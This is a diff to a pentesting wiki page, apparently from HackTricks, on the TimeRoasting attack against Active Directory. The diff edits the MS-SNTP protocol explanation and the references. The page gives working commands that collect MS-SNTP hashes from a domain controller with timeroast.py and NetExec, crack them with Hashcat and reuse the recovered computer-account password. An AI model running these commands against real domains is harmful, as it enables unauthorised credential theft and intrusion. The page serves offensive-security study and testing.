@@ -2,23 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-TimeRoasting abuses the legacy MS-SNTP authentication extension. In MS-SNTP, a client can send a 68-byte request that embeds any computer account RID; the domain controller uses the computer account's NTLM hash (MD4) as the key to compute a MAC over the response and returns it.<sup>[[1]](#references)</sup> Attackers can collect these MS-SNTP MACs unauthenticated and crack them offline (Hashcat mode 31300) to recover computer account passwords.<sup>[[2]](#references)</sup>
+TimeRoasting abuses legacy MS-SNTP authentication. An unauthenticated client can send a 68-byte request containing a chosen computer-account RID. For the exploitable legacy path, the domain controller derives the response authenticator through Netlogon using the computer account's NT hash (the MD4-derived password secret), giving the attacker a challenge/MAC pair suitable for offline password guessing (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>
 
-See section 3.1.5.1 "Authentication Request Behavior" and 4 "Protocol Examples" in the official MS-SNTP spec for details.<sup>[[1]](#references)</sup>
+Sections 3.1.5.1 and 4 of MS-SNTP describe the request and response behavior:<sup>[[1]](#references)</sup>
 ![TimeRoasting: See section 3.1.5.1 "Authentication Request Behavior" and 4 "Protocol Examples" in the official MS-SNTP spec for details](../../images/Pasted%20image%2020250709114508.png)
-When the ExtendedAuthenticatorSupported ADM element is false, the client sends a 68-byte request and embeds the RID in the least significant 31 bits of the Key Identifier subfield of the authenticator.<sup>[[1]](#references)</sup>
-
-> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.<sup>[[1]](#references)</sup>
-
-From section 4 (Protocol Examples):
-
-> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.<sup>[[1]](#references)</sup>
+When `ExtendedAuthenticatorSupported` is false, the request stores the RID in the low 31 bits of the authenticator's Key Identifier and a selector bit in the high bit. The server verifies the 68-byte length, extracts the RID, asks Netlogon to compute the candidate checksums, selects one using that high bit, zeroes the response Key Identifier, and returns the selected checksum.<sup>[[1]](#references)</sup>
 
 The crypto-checksum is MD5-based (see 3.2.5.1.1) and can be cracked offline, enabling the roasting attack.<sup>[[1]](#references)</sup>
 
 ## How to Attack
 
-[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
+[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort<sup>[[3]](#references)</sup>
 
 ```bash
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
@@ -29,7 +23,7 @@ hashcat -m 31300 ntp-hashes.txt
 
 ## Practical attack (unauth) with NetExec + Hashcat
 
-- NetExec can enumerate and collect MS-SNTP MACs for computer RIDs unauthenticated and print $sntp-ms$ hashes ready for cracking:<sup>[[4]](#references)</sup>
+- NetExec's `timeroast` module can enumerate computer RIDs, collect MS-SNTP MACs without authentication, and print `$sntp-ms$` hashes ready for cracking:<sup>[[4]](#references)</sup>
 
 ```bash
 # Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
@@ -51,8 +45,8 @@ hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
 netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
 ```
 
-Operational tips
-- Ensure accurate time sync before Kerberos: `sudo ntpdate <dc_fqdn>`
+### Operational notes
+- Ensure accurate time before using recovered credentials with Kerberos. Prefer a maintained NTP client such as `chronyd`/`systemd-timesyncd`; `ntpdate` is retained here as a common lab command: `sudo ntpdate <dc_fqdn>`.
 - If needed, generate krb5.conf for the AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
 - Map RIDs to principals later via LDAP/BloodHound once you have any authenticated foothold.
 
@@ -61,7 +55,7 @@ Operational tips
 - [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
 - [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
 - [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
-- [4] [NetExec – official docs](https://www.netexec.wiki/)
+- [4] [NetExec — `timeroast` module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
 - [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 {{#include ../../banners/hacktricks-training.md}}
